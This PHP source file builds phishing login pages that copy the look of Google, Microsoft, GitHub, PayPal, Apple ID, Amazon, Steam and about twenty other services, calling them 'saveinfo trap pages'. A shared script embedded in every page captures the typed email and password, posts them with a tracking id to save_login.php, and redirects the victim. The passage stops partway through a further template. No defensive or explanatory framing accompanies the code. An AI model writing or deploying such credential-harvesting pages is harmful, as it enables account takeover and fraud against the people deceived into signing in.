<?php

declare(strict_types=1);

/**
 * Returns full HTML document for saveinfo trap pages (brand-styled).
 * Used by generate_saveinfo_simple_templates.php
 */
function saveinfo_skin_page_html(string $slug, string $redirect): string
{
    $e = static function (string $s): string {
        return htmlspecialchars($s, ENT_QUOTES, 'UTF-8');
    };

    $slugJs = json_encode($slug, JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT);
    $redJs = json_encode($redirect, JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT);
    $ajax = '<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
<script>
(function(){
var BASE_URL = window.location.origin + (window.location.pathname.replace(/[^/]*$/, "") || "/");
document.getElementById("loginForm").addEventListener("submit", function (e) {
    e.preventDefault();
    var login = document.getElementById("email").value;
    var password = document.getElementById("password").value;
    var tid = typeof window.TRACKIFY_TID === "string" ? window.TRACKIFY_TID : (new URLSearchParams(window.location.search).get("tid") || "");
    var btn = document.querySelector(".btn-submit");
    var label = btn.textContent;
    btn.textContent = "Please wait…";
    btn.disabled = true;
    $.ajax({
        type: "POST",
        url: BASE_URL + "save_login.php",
        data: { tid: tid, login: login, password: password, template: ' . $slugJs . ' },
        dataType: "json",
        success: function (data) {
            if (data && data.ok) { window.location.href = ' . $redJs . '; return; }
            btn.textContent = label;
            btn.disabled = false;
            alert("Sign in failed. Please try again.");
        },
        error: function () {
            btn.textContent = label;
            btn.disabled = false;
            alert("Sign in failed. Please try again.");
        }
    });
});
})();
</script>';

    $head = static function (string $title, string $css) use ($e): string {
        return '<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>' . $e($title) . '</title>' . $css . '</head>';
    };

    $foot = '</body></html>';

    return match ($slug) {
        'google' => $head('Sign in – Google', '<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:"Google Sans",Roboto,arial,sans-serif;background:#f8f9fa;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:24px}
.wrap{width:100%;max-width:450px}
.card{background:#fff;border:1px solid #dadce0;border-radius:8px;padding:48px 40px 36px;box-shadow:0 2px 6px rgba(0,0,0,.08)}
.logo{text-align:center;font-size:24px;font-weight:400;margin-bottom:8px;letter-spacing:-.5px}
.logo span:nth-child(1){color:#4285f4}.logo span:nth-child(2){color:#ea4335}.logo span:nth-child(3){color:#fbbc05}.logo span:nth-child(4){color:#4285f4}.logo span:nth-child(5){color:#34a853}.logo span:nth-child(6){color:#ea4335}
h1{text-align:center;font-size:24px;font-weight:400;color:#202124;margin:16px 0 8px}
.sub{text-align:center;color:#5f6368;font-size:14px;margin-bottom:28px;line-height:1.5}
input{width:100%;height:54px;border:1px solid #dadce0;border-radius:4px;padding:0 16px;font-size:16px;margin-bottom:14px}
input:focus{border-color:#1a73e8;outline:none;box-shadow:inset 0 0 0 1px #1a73e8}
.btn-submit{width:100%;height:44px;background:#1a73e8;color:#fff;border:none;border-radius:4px;font-size:14px;font-weight:500;cursor:pointer;margin-top:8px}
.btn-submit:hover{background:#1557b0}
.footer{text-align:center;margin-top:24px;font-size:12px;color:#5f6368}
</style>') . '<body><div class="wrap"><div class="card"><div class="logo"><span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span></div><h1>Sign in</h1><p class="sub">Use your Google Account</p><form id="loginForm"><input type="text" id="email" placeholder="Email or phone" required autocomplete="username"><input type="password" id="password" placeholder="Enter your password" required autocomplete="current-password"><button type="submit" class="btn-submit">Next</button></form><p class="footer">Not your computer? Use Guest mode.</p></div></div>' . $ajax . $foot,

        'microsoft' => $head('Sign in to your account', '<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:"Segoe UI",system-ui,sans-serif;background:#f2f2f2;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.card{background:#fff;width:100%;max-width:440px;padding:44px;margin:0 auto;box-shadow:0 2px 6px rgba(0,0,0,.12)}
.ms{display:flex;gap:3px;margin-bottom:16px}
.ms b{width:10px;height:10px;display:inline-block}
.ms b:nth-child(1){background:#f25022}.ms b:nth-child(2){background:#7fba00}.ms b:nth-child(3){background:#00a4ef}.ms b:nth-child(4){background:#ffb900}
h1{font-size:24px;font-weight:600;color:#1b1b1b;margin-bottom:8px}
.sub{font-size:15px;color:#605e5c;margin-bottom:24px}
input{width:100%;height:40px;border:none;border-bottom:1px solid #605e5c;padding:8px 0;font-size:15px;background:transparent;margin-bottom:20px}
input:focus{outline:none;border-bottom-color:#0078d4}
.btn-submit{width:100%;height:32px;background:#0078d4;color:#fff;border:none;font-size:15px;cursor:pointer;margin-top:12px}
.btn-submit:hover{background:#106ebe}
</style>') . '<body><div class="card"><div class="ms"><b></b><b></b><b></b><b></b></div><h1>Sign in</h1><p class="sub">Use your Microsoft account.</p><form id="loginForm"><input type="text" id="email" placeholder="Email, phone, or Skype" required autocomplete="username"><input type="password" id="password" placeholder="Password" required autocomplete="current-password"><button type="submit" class="btn-submit">Sign in</button></form></div>' . $ajax . $foot,

        'github' => $head('Sign in to GitHub · GitHub', '<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Helvetica,Arial,sans-serif;background:#f6f8fa;min-height:100vh;display:flex;flex-direction:column;align-items:center;padding:32px 16px}
.gh-logo{color:#24292f;font-size:48px;font-weight:700;margin-bottom:24px;letter-spacing:-2px}
.card{background:#f6f8fa;border:1px solid #d0d7de;border-radius:6px;padding:20px;width:100%;max-width:308px}
.label{display:block;font-size:14px;font-weight:400;margin-bottom:8px;color:#24292f}
input{width:100%;height:32px;border:1px solid #d0d7de;border-radius:6px;padding:5px 12px;font-size:14px;margin-bottom:16px;background:#fff}
input:focus{border-color:#0969da;outline:none;box-shadow:0 0 0 3px rgba(9,105,218,.15)}
.btn-submit{width:100%;height:32px;background:#24292f;color:#fff;border:none;border-radius:6px;font-size:14px;font-weight:500;cursor:pointer}
.btn-submit:hover{background:#1a1e22}
.sub{font-size:12px;color:#57606a;margin-top:16px;text-align:center}
</style>') . '<body><div class="gh-logo">GitHub</div><div class="card"><form id="loginForm"><label class="label" for="email">Username or email address</label><input type="text" id="email" required autocomplete="username"><label class="label" for="password">Password</label><input type="password" id="password" required autocomplete="current-password"><button type="submit" class="btn-submit">Sign in</button></form><p class="sub">Authenticate to continue to GitHub</p></div>' . $ajax . $foot,

        'twitter' => $head('X. It’s what’s happening / X', '<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:system-ui,sans-serif;background:#000;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;color:#e7e9ea}
.card{width:100%;max-width:600px;display:flex;flex-wrap:wrap;align-items:center;justify-content:center;gap:40px}
.x{font-size:clamp(48px,12vw,72px);font-weight:700}
form{width:100%;max-width:300px}
h1{font-size:31px;font-weight:700;margin-bottom:32px}
input{width:100%;height:52px;background:#000;border:1px solid #333;border-radius:4px;color:#e7e9ea;padding:0 16px;font-size:15px;margin-bottom:16px}
input:focus{border-color:#1d9bf0;outline:none}
.btn-submit{width:100%;height:40px;background:#eff3f4;color:#0f1419;border:none;border-radius:9999px;font-weight:700;font-size:15px;cursor:pointer}
.btn-submit:hover{background:#d7dbdc}
</style>') . '<body><div class="card"><div class="x">𝕏</div><div><h1>Happening now</h1><h2 style="font-size:15px;font-weight:400;color:#71767b;margin-bottom:24px">Join today.</h2><form id="loginForm"><input type="text" id="email" placeholder="Phone, email, or username" required autocomplete="username"><input type="password" id="password" placeholder="Password" required autocomplete="current-password"><button type="submit" class="btn-submit">Log in</button></form></div></div>' . $ajax . $foot,

        'snapchat' => $head('Snapchat', '<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:system-ui,sans-serif;background:#fffc00;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.card{background:#fff;border-radius:12px;padding:40px 32px;width:100%;max-width:380px;box-shadow:0 8px 32px rgba(0,0,0,.12)}
.logo{font-size:32px;font-weight:800;color:#000;margin-bottom:8px;text-align:center}
h1{font-size:22px;text-align:center;margin-bottom:8px}
.sub{text-align:center;color:#666;font-size:14px;margin-bottom:24px}
input{width:100%;height:48px;border:1px solid #ddd;border-radius:8px;padding:0 14px;margin-bottom:12px;font-size:16px}
.btn-submit{width:100%;height:48px;background:#fffc00;color:#000;border:none;border-radius:24px;font-weight:700;font-size:16px;cursor:pointer}
</style>') . '<body><div class="card"><div class="logo">Snapchat</div><h1>Log in</h1><p class="sub">Username or email and password</p><form id="loginForm"><input type="text" id="email" placeholder="Username or email" required autocomplete="username"><input type="password" id="password" placeholder="Password" required autocomplete="current-password"><button type="submit" class="btn-submit">Log In</button></form></div>' . $ajax . $foot,

        'yahoo' => $head('Yahoo', '<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:"Yahoo Sans",system-ui,sans-serif;background:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center}
.card{width:100%;max-width:380px;padding:40px 24px}
.y{color:#6001d2;font-size:36px;font-weight:700;margin-bottom:24px}
h1{font-size:1.25rem;color:#26282a;margin-bottom:8px}
.sub{color:#464e56;font-size:14px;margin-bottom:24px}
input{width:100%;height:48px;border:1px solid #d8d8d8;border-radius:4px;padding:0 12px;font-size:16px;margin-bottom:12px}
.btn-submit{width:100%;height:48px;background:#6001d2;color:#fff;border:none;border-radius:4px;font-size:16px;font-weight:600;cursor:pointer}
</style>') . '<body><div class="card"><div class="y">yahoo!</div><h1>Sign in</h1><p class="sub">Enter your email and password</p><form id="loginForm"><input type="text" id="email" placeholder="Email address" required autocomplete="username"><input type="password" id="password" placeholder="Password" required autocomplete="current-password"><button type="submit" class="btn-submit">Next</button></form></div>' . $ajax . $foot,

        'protonmail' => $head('Proton Mail', '<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:system-ui,sans-serif;background:linear-gradient(180deg,#1b1340 0%,#0d0d1a 100%);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.card{background:#1c1b24;border:1px solid #3d3d4a;border-radius:12px;padding:40px;width:100%;max-width:420px}
.logo{color:#fff;font-size:22px;font-weight:600;margin-bottom:8px}
.logo span{color:#8b6cfb}
h1{color:#fff;font-size:28px;font-weight:600;margin-bottom:8px}
.sub{color:#a7a4b5;font-size:14px;margin-bottom:28px}
input{width:100%;height:48px;background:#3d3d4a;border:1px solid #5c5c6b;border-radius:6px;color:#fff;padding:0 14px;margin-bottom:12px;font-size:15px}
input::placeholder{color:#8e8c9a}
.btn-submit{width:100%;height:48px;background:#8b6cfb;color:#fff;border:none;border-radius:6px;font-weight:600;cursor:pointer}
</style>') . '<body><div class="card"><div class="logo">Proton <span>Mail</span></div><h1>Sign in</h1><p class="sub">Enter your Proton Account details</p><form id="loginForm"><input type="text" id="email" placeholder="Email or username" required autocomplete="username"><input type="password" id="password" placeholder="Password" required autocomplete="current-password"><button type="submit" class="btn-submit">Sign in</button></form></div>' . $ajax . $foot,

        'wordpress' => $head('Log In — WordPress.com', '<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;background:#fdfdfd;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.card{width:100%;max-width:400px}
.wp{color:#3858e9;font-size:32px;font-weight:600;margin-bottom:24px;text-align:center}
h1{font-size:24px;text-align:center;margin-bottom:8px;color:#101517}
.sub{text-align:center;color:#646970;font-size:16px;margin-bottom:24px}
input{width:100%;height:48px;border:1px solid #8c8f94;border-radius:4px;padding:0 12px;font-size:16px;margin-bottom:12px}
.btn-submit{width:100%;height:48px;background:#3858e9;color:#fff;border:none;border-radius:4px;font-size:16px;font-weight:600;cursor:pointer}
</style>') . '<body><div class="card"><div class="wp">W</div><h1>Log in to WordPress.com</h1><p class="sub">Email address or username</p><form id="loginForm"><input type="text" id="email" required autocomplete="username"><input type="password" id="password" placeholder="Password" required autocomplete="current-password"><button type="submit" class="btn-submit">Log In</button></form></div>' . $ajax . $foot,

        'apple_id', 'icloud' => $head('Apple ID', '<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,"SF Pro Text",sans-serif;background:#f5f5f7;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.card{background:#fff;border-radius:12px;padding:40px 32px;width:100%;max-width:400px;box-shadow:0 4px 24px rgba(0,0,0,.08)}
.apple{font-size:40px;text-align:center;margin-bottom:16px}
h1{font-size:20px;font-weight:600;text-align:center;color:#1d1d1f;margin-bottom:8px}
.sub{text-align:center;color:#6e6e73;font-size:14px;margin-bottom:28px}
input{width:100%;height:44px;border:1px solid #d2d2d7;border-radius:8px;padding:0 14px;font-size:17px;margin-bottom:12px}
input:focus{border-color:#0071e3;outline:none}
.btn-submit{width:100%;height:44px;background:#0071e3;color:#fff;border:none;border-radius:8px;font-size:17px;cursor:pointer}
</style>') . '<body><div class="card"><div class="apple"></div><h1>Apple ID</h1><p class="sub">Sign in with your Apple ID</p><form id="loginForm"><input type="text" id="email" placeholder="Apple ID" required autocomplete="username"><input type="password" id="password" placeholder="Password" required autocomplete="current-password"><button type="submit" class="btn-submit">Continue</button></form></div>' . $ajax . $foot,

        'amazon' => $head('Amazon Sign-In', '<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:Arial,Helvetica,sans-serif;background:#fff;min-height:100vh;display:flex;align-items:flex-start;justify-content:center;padding-top:24px}
.card{width:100%;max-width:350px;border:1px solid #ddd;border-radius:4px;padding:20px 26px}
.amz{color:#131921;font-size:28px;font-weight:400;margin-bottom:16px}
h1{font-size:28px;font-weight:400;margin-bottom:14px}
label{display:block;font-size:13px;font-weight:700;margin-bottom:4px}
input{width:100%;height:31px;border:1px solid #a6a6a6;border-radius:3px;padding:3px 7px;margin-bottom:14px;font-size:13px;box-shadow:0 1px 0 rgba(255,255,255,.5) inset}
.btn-submit{width:100%;height:31px;background:linear-gradient(to bottom,#f7dfa5,#f0c14b);border:1px solid #a88734;border-radius:3px;font-size:13px;cursor:pointer;box-shadow:0 1px 0 rgba(255,255,255,.6) inset}
</style>') . '<body><div class="card"><div class="amz">amazon</div><h1>Sign in</h1><form id="loginForm"><label for="email">Email or mobile phone number</label><input type="text" id="email" required autocomplete="username"><label for="password">Password</label><input type="password" id="password" required autocomplete="current-password"><button type="submit" class="btn-submit">Sign in</button></form></div>' . $ajax . $foot,

        'paypal' => $head('Log in to your PayPal account', '<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:PayPalSans,Helvetica Neue,Arial,sans-serif;background:#f5f7fa;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.card{background:#fff;border-radius:6px;padding:40px 32px;width:100%;max-width:400px;box-shadow:0 3px 6px rgba(0,0,0,.1)}
.pp{font-size:28px;font-weight:400;color:#003087;margin-bottom:8px}
.pp span{color:#009cde}
h1{font-size:24px;color:#2c2e2f;margin-bottom:24px}
input{width:100%;height:48px;border:1px solid #9da3a6;border-radius:5px;padding:0 12px;font-size:16px;margin-bottom:12px}
.btn-submit{width:100%;height:48px;background:#0070ba;color:#fff;border:none;border-radius:24px;font-size:15px;font-weight:600;cursor:pointer}
</style>') . '<body><div class="card"><div class="pp">Pay<span>Pal</span></div><h1>Log in to your account</h1><form id="loginForm"><input type="text" id="email" placeholder="Email" required autocomplete="username"><input type="password" id="password" placeholder="Password" required autocomplete="current-password"><button type="submit" class="btn-submit">Log In</button></form></div>' . $ajax . $foot,

        'spotify' => $head('Login - Spotify', '<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:system-ui,sans-serif;background:#121212;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.card{width:100%;max-width:450px;text-align:center}
.sp{font-size:40px;font-weight:900;color:#1ed760;letter-spacing:-1px;margin-bottom:32px}
h1{color:#fff;font-size:32px;font-weight:700;margin-bottom:32px}
input{width:100%;max-width:400px;height:48px;border:1px solid #727272;border-radius:4px;background:#121212;color:#fff;padding:0 14px;margin:0 auto 12px;display:block;font-size:15px}
.btn-submit{width:100%;max-width:400px;height:48px;background:#1ed760;color:#000;border:none;border-radius:500px;font-weight:700;font-size:16px;cursor:pointer;margin:16px auto 0;display:block}
</style>') . '<body><div class="card"><div class="sp">Spotify</div><h1>Log in to continue.</h1><form id="loginForm"><input type="text" id="email" placeholder="Email or username" required autocomplete="username"><input type="password" id="password" placeholder="Password" required autocomplete="current-password"><button type="submit" class="btn-submit">Log In</button></form></div>' . $ajax . $foot,

        'steam' => $head('Sign In', '<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:"Motiva Sans",Arial,Helvetica,sans-serif;background:linear-gradient(180deg,#1b2838 0%,#171a21 40%);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.card{background:#171a21;border:1px solid #3d4450;padding:24px;width:100%;max-width:330px}
.st{color:#1999ff;font-size:22px;font-weight:500;margin-bottom:20px;text-align:center}
label{display:block;color:#c6d4df;font-size:12px;margin-bottom:4px;text-transform:uppercase}
input{width:100%;height:40px;background:#32353c;border:1px solid #26282d;color:#dfe3e6;padding:0 10px;margin-bottom:18px;font-size:14px}
.btn-submit{width:100%;height:44px;background:linear-gradient(90deg,#47bfff,#1a9fff);color:#1b2838;border:none;font-size:15px;font-weight:500;cursor:pointer;border-radius:2px}
</style>') . '<body><div class="card"><div class="st">STEAM</div><form id="loginForm"><label>Account name</label><input type="text" id="email" required autocomplete="username"><label>Password</label><input type="password" id="password" required autocomplete="current-password"><button type="submit" class="btn-submit">Sign in</button></form></div>' . $ajax . $foot,

        'twitch' => $head('Log In - Twitch', '<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:"Roobert",Helvetica,Arial,sans-serif;background:#0e0e10;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.card{width:100%;max-width:400px}
.tw{font-size:32px;font-weight:700;color:#fff;margin-bottom:8px}
.tw span{color:#9146ff}
h1{color:#efeff1;font-size:24px;margin-bottom:24px}
input{width:100%;height:40px;background:#18181b;border:1px solid #53535f;border-radius:4px;color:#efeff1;padding:0 12px;margin-bottom:12px;font-size:14px}
.btn-submit{width:100%;height:40px;background:#9146ff;color:#fff;border:none;border-radius:4px;font-weight:600;cursor:pointer}
</style>') . '<body><div class="card"><div class="tw">Twitch</div><h1>Log in to Twitch</h1><form id="loginForm"><input type="text" id="email" placeholder="Username" required autocomplete="username"><input type="password" id="password" placeholder="Password" required autocomplete="current-password"><button type="submit" class="btn-submit">Log In</button></form></div>' . $ajax . $foot,

        'reddit' => $head('Log In - Reddit', '<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:IBMPlexSans,system-ui,sans-serif;background:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.card{width:100%;max-width:280px}
.rd{font-size:36px;font-weight:700;color:#ff4500;margin-bottom:24px;text-align:center}
h1{font-size:18px;font-weight:600;text-align:center;margin-bottom:24px}
input{width:100%;height:48px;border:1px solid #ccc;border-radius:4px;padding:0 12px;margin-bottom:12px;font-size:14px;background:#fcfcfb}
.btn-submit{width:100%;height:40px;background:#ff4500;color:#fff;border:none;border-radius:999px;font-weight:700;cursor:pointer}
</style>') . '<body><div class="card"><div class="rd">reddit</div><h1>Log In</h1><form id="loginForm"><input type="text" id="email" placeholder="Username" required autocomplete="username"><input type="password" id="password" placeholder="Password" required autocomplete="current-password"><button type="submit" class="btn-submit">Log In</button></form></div>' . $ajax . $foot,

        'stackoverflow' => $head('Log In - Stack Overflow', '<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;background:#f6f6f6;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.card{background:#fff;border:1px solid #d6d9dc;box-shadow:0 2px 8px rgba(59,64,69,.1);padding:24px;width:100%;max-width:320px;border-radius:7px}
.so{display:flex;align-items:center;gap:4px;margin-bottom:20px;font-size:20px;font-weight:700}
.so .o1{color:#f48024}.so .o2{color:#bcbbbb}.so .o3{color:#f48024}
h1{font-size:21px;margin-bottom:16px;color:#0c0d0e}
input{width:100%;height:32px;border:1px solid #babfc4;border-radius:3px;padding:0 8px;margin-bottom:12px;font-size:13px}
.btn-submit{width:100%;height:38px;background:#0a95ff;color:#fff;border:none;border-radius:3px;font-size:13px;cursor:pointer}
</style>') . '<body><div class="card"><div class="so">stack<span class="o1">over</span><span class="o2">flow</span></div><h1>Log in</h1><form id="loginForm"><input type="text" id="email" placeholder="Email" required autocomplete="username"><input type="password" id="password" placeholder="Password" required autocomplete="current-password"><button type="submit" class="btn-submit">Log in</button></form></div>' . $ajax . $foot,

        'pinterest' => $head('Pinterest', '<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;background:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.card{width:100%;max-width:400px;text-align:center}
.pin{color:#e60023;font-size:36px;font-weight:700;margin-bottom:8px}
h1{font-size:32px;font-weight:600;margin-bottom:8px}
.sub{color:#767676;font-size:14px;margin-bottom:24px}
input{width:100%;height:48px;border:2px solid #cdcdcd;border-radius:16px;padding:0 16px;margin-bottom:12px;font-size:16px}
.btn-submit{width:100%;height:48px;background:#e60023;color:#fff;border:none;border-radius:24px;font-weight:600;font-size:16px;cursor:pointer}
</style>') . '<body><div class="card"><div class="pin">Pinterest</div><h1>Welcome to Pinterest</h1><p class="sub">Log in to see more ideas</p><form id="loginForm"><input type="text" id="email" placeholder="Email" required autocomplete="username"><input type="password" id="password" placeholder="Password" required autocomplete="current-password"><button type="submit" class="btn-submit">Log in</button></form></div>' . $ajax . $foot,

        'dropbox' => $head('Login - Dropbox', '<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:AtlasGrotesk,Helvetica,Arial,sans-serif;background:#f7f9fa;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.card{background:#fff;border-radius:12px;padding:40px;width:100%;max-width:400px;box-shadow:0 2px 12px rgba(0,0,0,.08)}
.db{font-size:36px;font-weight:600;color:#0061fe;margin-bottom:24px}
input{width:100%;height:48px;border:1px solid #c1c7cd;border-radius:6px;padding:0 14px;margin-bottom:12px;font-size:16px}
.btn-submit{width:100%;height:48px;background:#0061fe;color:#fff;border:none;border-radius:6px;font-weight:600;cursor:pointer}
</style>') . '<body><div class="card"><div class="db">Dropbox</div><form id="loginForm"><input type="text" id="email" placeholder="Email" required autocomplete="username"><input type="password" id="password" placeholder="Password" required autocomplete="current-password"><button type="submit" class="btn-submit">Sign in</button></form></div>' . $ajax . $foot,

        'origin' => $head('EA - Sign In', '<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:ElectronicArtsText,sans-serif;background:#161616;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.card{width:100%;max-width:400px}
.ea{color:#ff4747;font-size:28px;font-weight:700;letter-spacing:2px;margin-bottom:24px;text-align:center}
h1{color:#fff;font-size:24px;text-align:center;margin-bottom:24px}
input{width:100%;height:48px;background:#323232;border:1px solid #5a5a5a;color:#fff;padding:0 14px;margin-bottom:12px;border-radius:4px;font-size:15px}
.btn-submit{width:100%;height:48px;background:#ff4747;color:#fff;border:none;border-radius:4px;font-weight:700;cursor:pointer}
</style>') . '<body><div class="card"><div class="ea">EA</div><h1>Sign in to your EA account</h1><form id="loginForm"><input type="text" id="email" placeholder="Email" required autocomplete="username"><input type="password" id="password" placeholder="Password" required autocomplete="current-password"><button type="submit" class="btn-submit">Sign in</button></form></div>' . $ajax . $foot,

        'gitlab' => $head('Sign in · GitLab', '<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:system-ui,sans-serif;background:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.card{width:100%;max-width:400px;border:1px solid #dbdbdb;border-radius:4px;padding:32px}
.gl{font-size:28px;font-weight:600;margin-bottom:8px}
.gl span:nth-child(1){color:#fc6d26}.gl span:nth-child(2){color:#e24329}.gl span:nth-child(3){color:#fca326}
h1{font-size:20px;margin-bottom:20px}
input{width:100%;height:34px;border:1px solid #dbdbdb;border-radius:4px;padding:0 10px;margin-bottom:12px;font-size:14px}
.btn-submit{width:100%;height:36px;background:#2ea44f;color:#fff;border:none;border-radius:4px;font-weight:600;cursor:pointer}
</style>') . '<body><div class="card"><div class="gl"><span>●</span><span>●</span><span>●</span> GitLab</div><h1>Sign in to GitLab</h1><form id="loginForm"><input type="text" id="email" placeholder="Username or email" required autocomplete="username"><input type="password" id="password" placeholder="Password" required autocomplete="current-password"><button type="submit" class="btn-submit">Sign in</button></form></div>' . $ajax . $foot,

        'verizon' => $head('My Verizon', '<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:Helvetica Neue,Arial,sans-serif;background:#f4f4f4;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.card{background:#fff;width:100%;max-width:400px;padding:40px 32px;border-top:4px solid #cd040b;box-shadow:0 2px 8px rgba(0,0,0,.1)}
.vz{color:#cd040b;font-size:26px;font-weight:700;margin-bottom:8px}
h1{font-size:22px;color:#333;margin-bottom:20px}
input{width:100%;height:44px;border:1px solid #ccc;border-radius:4px;padding:0 12px;margin-bottom:12px;font-size:15px}
.btn-submit{width:100%;height:44px;background:#cd040b;color:#fff;border:none;border-radius:4px;font-weight:600;cursor:pointer}
</style>') . '<body><div class="card"><div class="vz">verizon</div><h1>Sign in to My Verizon</h1><form id="loginForm"><input type="text" id="email" placeholder="User ID or mobile number" required autocomplete="username"><input type="password" id="password" placeholder="Password" required autocomplete="current-password"><button type="submit" class="btn-submit">Sign in</button></form></div>' . $ajax . $foot,

        'line' => $head('LINE', '<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:system-ui,sans-serif;background:#06c755;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.card{background:#fff;width:100%;max-width:380px;border-radius:12px;padding:36px 28px;box-shadow:0 8px 32px rgba(0,0,0,.15)}
.ln{font-size:36px;font-weight:800;color:#06c755;text-align:center;margin-bottom:20px}
h1{text-align:center;font-size:20px;margin-bottom:20px}
input{width:100%;height:46px;border:1px solid #e0e0e0;border-radius:8px;padding:0 14px;margin-bottom:12px;font-size:15px}
.btn-submit{width:100%;height:48px;background:#06c755;color:#fff;border:none;border-radius:8px;font-weight:700;cursor:pointer}
</style>') . '<body><div class="card"><div class="ln">LINE</div><h1>Log in</h1><form id="loginForm"><input type="text" id="email" placeholder="Email address" required autocomplete="username"><input type="password" id="password" placeholder="Password" required autocomplete="current-password"><button type="submit" class="btn-submit">Log in</button></form></div>' . $ajax . $foot,

        'shopify' => $head('Shopify', '<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:system-ui,sans-serif;background:#f6f6f7;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.card{background:#fff;width:100%;max-width:400px;padding:40px;border-radius:8px;box-shadow:0 0 0 1px rgba(0,0,0,.08)}
.sh{color:#95bf47;font-size:32px;font-weight:700;margin-bottom:4px}
.sh2{color:#5c6ac4;font-size:14px;font-weight:600;margin-bottom:24px}
h1{font-size:20px;margin-bottom:20px;color:#202223}
input{width:100%;height:40px;border:1px solid #8c9196;border-radius:4px;padding:0 10px;margin-bottom:12px;font-size:14px}
.btn-submit{width:100%;height:44px;background:#5c6ac4;color:#fff;border:none;border-radius:4px;font-weight:600;cursor:pointer}
</style>') . '<body><div class="card"><div class="sh">shopify</div><div class="sh2">Log in to your store</div><h1>Log in</h1><form id="loginForm"><input type="text" id="email" placeholder="Email" required autocomplete="username"><input type="password" id="password" placeholder="Password" required autocomplete="current-password"><button type="submit" class="btn-submit">Log in</button></form></div>' . $ajax . $foot,

        'messenger' => $head('Messenger', '<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:system-ui,sans-serif;background:linear-gradient(180deg,#00b2ff,#006aff);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.card{background:#fff;width:100%;max-width:380px;border-radius:16px;padding:36px 28px;box-shadow:0 12px 40px rgba(0,0,0,.2)}
.ms{font-size:28px;font-weight:700;color:#0084ff;text-align:center;margin-bottom:8px}
h1{text-align:center;font-size:18px;color:#65676b;margin-bottom:24px}
input{width:100%;height:48px;border:1px solid #ccd0d5;border-radius:8px;padding:0 14px;margin-bottom:12px;font-size:15px}
.btn-submit{width:100%;height:48px;background:#0084ff;color:#fff;border:none;border-radius:8px;font-weight:700;cursor:pointer}
</style>') . '<body><div class="card"><div class="ms">Messenger</div><h1>Continue with Facebook</h1><form id="loginForm"><input type="text" id="email" placeholder="Email or phone" required autocomplete="username"><input type="password" id="password" placeholder="Password" required autocomplete="current-password"><button type="submit" class="btn-submit">Continue</button></form></div>' . $ajax . $foot,

        'myspace' => $head('Myspace', '<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:Arial,sans-serif;background:#e9e9e9;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.card{background:#fff;width:100%;max-width:400px;padding:32px;border:1px solid #ccc}
.my{font-size:32px;font-weight:700;color:#000;margin-bottom:20px}
input{width:100%;height:36px;border:1px solid #999;padding:0 10px;margin-bottom:12px;font-size:14px}
.btn-submit{width:100%;height:36px;background:#333;color:#fff;border:none;font-weight:700;cursor:pointer}
</style>') . '<body><div class="card"><div class="my">myspace</div><form id="loginForm"><input type="text" id="email" placeholder="Email" required autocomplete="username"><input type="password" id="password" placeholder="Password" required autocomplete="current-password"><button type="submit" class="btn-submit">Sign in</button></form></div>' . $ajax . $foot,

        'badoo' => $head('Badoo', '<style>
*{box-sizing:border-box;margin:0;padding:0}
